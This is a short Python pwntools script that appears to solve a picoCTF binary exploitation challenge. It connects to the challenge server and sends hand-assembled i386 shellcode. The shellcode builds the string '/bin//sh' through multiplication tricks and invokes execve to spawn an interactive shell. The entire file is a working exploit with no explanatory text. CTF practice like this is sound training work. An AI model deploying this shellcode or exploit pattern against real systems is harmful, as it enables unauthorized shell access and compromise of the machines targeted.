#!/usr/bin/env python
from pwn import *
context.arch = "i386"
r = process("./fun")
r = remote("mercury.picoctf.net", 40525)

r.recvuntil("run:")
sc = asm("""
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    mov bl, 16 
    push ecx
    nop
    mov al, 104
    mul ebx
    mul ebx
    mov al, 115
    mul ebx
    mul ebx
    mov al, 47
    mul ebx
    mul ebx
    mov al, 47
    push eax
    nop
    xor eax, eax
    mov al, 110
    mul ebx
    mul ebx
    mov al, 105
    mul ebx
    mul ebx
    mov al, 98
    mul ebx
    mul ebx
    mov al, 47
    push eax
    nop
    xor eax, eax
    mov al, 11
    mov ebx, esp
    int 0x80
    """)
success("shellcode : %s" % sc)
#pause()
r.sendline(sc)

r.interactive()
r.close()
